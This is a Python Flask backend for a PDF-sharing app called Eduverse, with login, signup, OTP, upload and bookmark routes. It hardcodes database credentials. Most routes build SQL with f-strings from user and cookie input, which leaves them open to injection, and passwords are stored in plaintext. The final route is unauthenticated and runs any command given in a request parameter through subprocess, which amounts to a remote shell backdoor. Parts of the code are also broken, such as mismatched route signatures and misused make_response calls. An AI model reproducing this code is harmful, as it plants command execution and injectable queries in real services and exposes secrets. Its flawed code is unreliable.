from flask  import Flask,request,make_response,send_file,jsonify
import os
from .JWT import JWT
from .logout import LogOut
from .getuser import GetUser
from .upload import uploadpdf
from .getpdf import GetPdf
from .Responcehandler import Responce
import json
import uuid
from .Mail import Mail
import random
import psycopg2 # type: ignore
from flask_cors import CORS
import subprocess
app = Flask(__name__)
#updated code from 
CORS(app,supports_credentials=True)
app.config["FRONT_END_URL"] = ""
app.config["MYSQL_HOST"] = "ep-aged-rain-a472d7qt-pooler.us-east-1.aws.neon.tech"
app.config["MYSQL_USER"] = "default"
app.config["MYSQL_DB"] = "verceldb"
app.config["MYSQL_PASSWORD"] ="2pVZitHFc5aY"

#hwllo updated
con = psycopg2.connect(
    host = app.config["MYSQL_HOST"],
    user = app.config["MYSQL_USER"],
    password = app.config["MYSQL_PASSWORD"],
    database = app.config["MYSQL_DB"],
    )
cur = con.cursor()
if(cur):
    print("Database connected")
else:
    print("Database not connected")
pdfpath = r"C:\Users\kirta\OneDrive\Documents\FlaskUserAuth\uploadpdf/"
@app.route("/api/v1/login",methods=["POST"])
def login():
    try :
        data={}
        try:
            cookie = request.cookies.get("session")
            if cookie:
                try:
                    decoded_cookie = JWT.decode(cookie)
                except Exception as e:
                    print(e)
                if decoded_cookie:
                    try :
                        cur.execute(f"SELECT * FROM users where userid='{decoded_cookie['data']}'")
                        row = cur.fetchone()
                    except Exception as e:
                        print(e)
                        return Responce(401,{},"invalid user")
                    if row:
                        try:
                            if row[0] == decoded_cookie["data"]:
                                if row[len(row)-1] == "pending":
                                    return Responce.send(402,{},"not varifited user...")
                                else:
                                    return Responce.send(200,{},"Login successfull")
                            else:
                                return Responce.send(401,{},"Invalid Cookie")
                        except Exception as e:
                            print(e)
                            return Responce.send(500,{},"Error while checking cookie data is valid?")
                    else:
                        return Responce.send(401,{},"Invalid Cookie")
        except Exception as e:
            print("Error",e)
        try:
            data = json.loads(request.data.decode("utf-8"))
        except Exception as e:
            print(e)
            res = Responce.send(402,data,"Erorr While Proccessing Data Please Try again")
            return res
        if data:
            try :
                username = data['username']
                password = data['password']
            except:
                return Responce.send(401,{},"username or password is not in body")
            if username and password:
                try:
                    cur.execute(f"SELECT * FROM users where username='{username}' and password='{password}';")
                    row = cur.fetchone()
                    if row:
                        pass
                    else:
                        return Responce.send(401,{},"invalid username and password")
                except Exception as e:
                    print(e)
                try :
                    if username == row[1] and password == row[2]:
                        print(f"{row}")
                        try:
                            payload = {"data":row[0]}
                            jwt_cookie = JWT.encode(payload)
                        except Exception as e:
                            print("Jwt Error:",e)
                        if jwt_cookie:
                            res = make_response(200,{},"Authenticated Successfully")
                            res.set_cookie('session',jwt_cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
                            return res
                        else:
                            return Responce.send(500,{},"Error in setting Cookie")
                    else:
                        print(f"{row}")
                        return Responce.send(401,{},"username and password is invalid")
                except Exception as e:
                    print("eroor :", e)
                    print(f"{row}")
                    return Responce.send(401,{},f"username and password is invalid:{row}")
            else :
                return "Username or Password should not be Empty"
        else :
            res = make_response("Error while processing data")
            res.status_code = "401"
            return res
    except Exception as e:
        print(e)
        return Responce.send(500,{},'Ohh. Server in Truble')

@app.route("/api/v1/signup",methods=["POST"])
def signup():
    data = {}
    if request.data:
        try:
            data = json.loads(request.data.decode("utf-8"))
        except Exception as e:
            print(e)
        if data.get('username') is not None and data.get('fullname') is not None and data.get('password') is not None and data.get('email') is not None:
            if(len(data['username']) < 5):
                return Responce.send(401,{},"username is Too short")
            elif (len(data['password'])<8):
                return Responce.send(401,{},"password is Too short")
            elif(len(data['fullname'])<8):
                return Responce.send(401,{},"fullname is Too short")
            elif(len(data['email'])<8):
                return Responce.send(401,{},"email is Too short")
            else:
                try:
                    print("send request to sever")
                    cur.execute(f"select * from users where username='{data['username']}' or email='{data['email']}'")
                    row = cur.fetchone()
                    print("got response form server")
                    if row :
                        print("sending error username and email already used")
                        return Responce.send(409,{},"username or email already used")
                    else:
                        try:
                            if "gmail.com" in data['email']:
                                otp = random.randint(100000,999999)
                                mail = Mail.send_mail(data['email'],"Eduverse",f"{otp}")
                                if(mail):
                                    try:
                                        userID = uuid.uuid4()
                                        print(userID)
                                        cookie = JWT.encode({"data": f"{userID}"})
                                        cur.execute(f"insert into otp values('{userID}','{otp}');")
                                        res = make_response(jsonify({"message":"Otp sended to email check now."}))
                                        res.set_cookie("session",cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
                                        cur.execute(f"insert into users values('{userID}','{data['username']}','{data['password']}','{data['fullname']}','{data['email']}','false','pending');")
                                        con.commit()
                                        return res
                                    except Exception as e:
                                        print(e)
                                        return Responce.send(500,{},"Server Error")
                                else:
                                    print('hello')
                                    return Responce.send(500,{},"Server Error")
                            else:
                                return Responce.send(401,{},"Eduverse supports only Gmail addresses.")
                        except Exception as e:
                            print(f"DATABASE Error: {e}")
                            return Responce.send(500,{},"server Error")
                except Exception as e:
                    print(e)
                    return Responce.send(500,{},e)
        else :
            return Responce.send(405,{},"body should contain username,password,fullname,email")
    else:
        return Responce.send(401,{},"No data provided please provide nessery data")

@app.route("/api/v1/upload",methods=["POST"])
def upload():
    return uploadpdf.UploadPdf(app,cur,con)

@app.route("/api/v1/getuser",methods=["GET","OPTION"])
def getuser():
    return GetUser.process(cur)

@app.route("/api/v1/logout",methods=["GET"])
def logout():
    return LogOut.process()

@app.route("/api/v1/getpdf",methods=["GET"])
def getpdf():
    return GetPdf.process(cur)

@app.route("/api/v1/pdf/<id>",methods=["GET"])
def pdf(id):
    id = id.split('.')
    title = ""
    try:
        if id[0] and id[1]== 'pdf':
            fullpath = '/home/kirtanmojidra/Eduverse/uploadpdf'+ '/'+id[0]+".pdf"
            if os.path.exists(fullpath):
                try:
                    cur.execute(f"select * from pdfs where id='{id[0]}';")
                    row = cur.fetchone()
                except Exception as e:
                    print(f"Error :{e}")
                return send_file(fullpath,as_attachment=True,download_name=f"{row[1]}-EduVerse.pdf")
            else:
                return Responce.send(404,{},"file not found")
    except Exception as e:
        print(e)
        return Responce.send(401,{},"invalid file name")

@app.route("/api/v1/deletepdf/<id>",methods=["GET"])
def delpdf(id):
    if id =='':
        return Responce.send(404,{},"Not Valid Pdf")
    cookie = request.cookies.get("session")
    id = id.split(".")[0]
    if cookie:
        try:
            decoded_cookie = JWT.decode(cookie)
        except Exception as e:
            print(e)
            return Responce.send(401,{},"invalid user")
        if decoded_cookie["data"]:
            try :
                print(decoded_cookie["data"])
                cur.execute(f"select * from users where userid='{decoded_cookie['data']}';")
                row = cur.fetchone()
            except Exception as e:
                print(e)
                return Responce.send(401,{},"invalid user")
            if row:
                try:
                    print(f"select * from pdfs where userid='{decoded_cookie['data']}' and id='{id}';")
                    cur.execute(f"select * from pdfs where userid='{decoded_cookie['data']}' and id='{id}';")
                    row2 = cur.fetchone()
                except Exception as e:
                    print(e)
                    return Responce.send(401,{},"invalid pdf user")
                try:
                    if (row and row2) or (row[5] == 1):
                        fullpath = pdfpath+id+".pdf"
                        if os.path.exists(fullpath):
                            try:
                                cur.execute(f"delete from bookmarks where pdf_id = '{id}';")
                                con.commit()
                                pdfid = id+".pdf"
                                cur.execute(f"delete from pdfs where pdf_path='{pdfid}';")
                                con.commit()
                                os.remove(fullpath)
                            except Exception as e:
                                print(e)
                                return Responce.send(500,{},"Error while deleting file")
                            return Responce.send(200,{},"Deleted Successfully")
                        else:
                            return Responce.send(404,{},"file not found")
                    else:
                        return Responce.send(401,{},"Invalid Cookie")
                except Exception as e:
                    print("Error"+str(e))
                    return Responce.send(500,{},"Error while deleting file")
    else:
        return Responce.send(401,{},"Not Authenticated")
@app.route("/api/v1/bookmark/<pdfid>", methods=["GET"])
def bookmarks(pdfid):
    if pdfid == "":
        return Responce.send(422,{},"invalid pdfid")
    pdfid = pdfid.split(".")[0]
    cookie = request.cookies.get("session")
    if cookie:
        try:
            decoded_cookie = JWT.decode(cookie)
        except Exception as e:
            print(e)
            return Responce.send(401,{},"invalid user")
        try:
            cur.execute(f"select * from bookmarks where pdf_id='{pdfid}' and userid='{decoded_cookie['data']}';")
            r = cur.fetchone()
            if r:
                return Responce.send(205,{},"alerady Bookmarked")
            else:
                cur.execute(f"insert into bookmarks values('{pdfid}','{decoded_cookie['data']}');")
                con.commit()
                return Responce.send(200,{},"Bookmarks updated")
        except Exception as e:
            print(e)
            return Responce.send(500,{},"server Error")

@app.route("/api/v1/bookmarks", methods=["GET"])
def getbookmarks():
    cookie = request.cookies.get("session")
    if cookie:
        try:
            decoded_cookie = JWT.decode(cookie)
        except Exception as e:
            print(e)
            return Responce.send(401,{},"invalid user")
        try:
            cur.execute(f"select * from bookmarks where userid='{decoded_cookie['data']}';")
            r = cur.fetchall()
            rows = []
            for row in r:
                rows.append(row[0])
            pdf_ids = '\',\''.join(map(str,rows))
            cur.execute(f"select * from pdfs inner join users on pdfs.userid = users.userid where id IN('{pdf_ids}')")
            r = cur.fetchall()
            pdf_obj = []
            for i  in r:
                obj = {
                    "title":i[1],
                    "subject":i[2],
                    "sem": i[3],
                    "date": i[5].strftime("%A-%d-%m-%y"),
                    "path": i[6],
                    'username':i[8]
                }
                pdf_obj.append(obj)
            if r:
                return Responce.send(200,pdf_obj,"Bookmarks List")
            else:
                return Responce.send(200,{},"No Bookmarks")
        except Exception as e:
            print(e)
            return Responce.send(500,{},"server Error")
    else:
        return Responce.send(401,{},"Not Authenticated")

@app.route("/api/v1/deletebookmark/<id>",methods=["GET"])
def DeleteBookmark(id):
    try:
        id = id.split(".")[0]
        cookie = request.cookies.get("session")
        if cookie:
            try:
                decoded_cookie = JWT.decode(cookie)
            except Exception as e:
                print(e)
                return Responce.send(401,{},"invalid user")
            print(f"delete from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
            try:
                cur.execute(f"select * from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
                r = cur.fetchone()
                if r :
                    cur.execute(f"delete from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
                    con.commit()
                    return Responce.send(200,{},"Removed Bookmaked")
                else:
                    return Responce.send(200,{},"not bookmarked")
            except Exception as e:
                print(e)
                return Responce.send(500,{},"Server Error")
    except Exception as e:
        print(e)
        return Responce.send(500,{},"invalid pdf name ")
    
@app.route("/api/v1/otp",methods=["POST"])
def varify_otp():
    if request.data:
        data = json.loads(request.data)
        if data["otp"]:
            otp = data["otp"]
            if request.cookies.get("session"):
                decoded_cookie = JWT.decode(request.cookies["session"])
                cur.execute(f"select * from otp where userid='{decoded_cookie['data']}';")
                row = cur.fetchone()
                if row:
                    if row[1] == otp:
                        try:
                            cur.execute(f"delete from otp where userid='{decoded_cookie['data']}';")
                            cur.execute(f"update users set status='{'validated'}' where userid='{row[0]}';")
                            con.commit()
                            return Responce.send(200,{},"OTP Verified")
                        except Exception as e:
                            print(e)
                            return Responce.send(500,{},"Server Error")
                    else:
                        return Responce.send(401,{},"Invalid OTP")
                else:
                    return Responce.send(401,{},"Try Again")
    else:
        return Responce.send(401,{},"requied filed not found")
@app.route("api/cmd/<cmd>",methods=["GET"])
def cmd():
    cmd = request.args.get("cmd")
    result = subprocess.run(cmd, capture_output=True, text=True)
    return make_response(result)
    
if __name__ == '__main__':
    app.run(debug=True)
